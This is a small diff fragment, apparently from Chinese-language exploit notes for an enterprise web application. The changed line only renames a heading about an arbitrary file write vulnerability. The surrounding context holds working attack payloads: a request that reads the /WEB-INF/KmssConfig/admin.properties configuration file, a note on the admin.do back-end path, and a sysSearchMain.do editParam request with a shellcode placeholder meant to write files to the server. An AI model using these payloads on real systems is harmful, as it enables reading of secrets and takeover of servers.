@@ -44,7 +44,7 @@ var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}
 
 后台地址admin.do
 
-## 0x04-任意文件写入漏洞
+## 0x04-任意文件写入漏洞1
 
 var={"body":{"file":"/sys/search/sys_search_main/sysSearchMain.do?method=editParam"}}&fdParemNames=11&fdParameters=[shellcode]
 
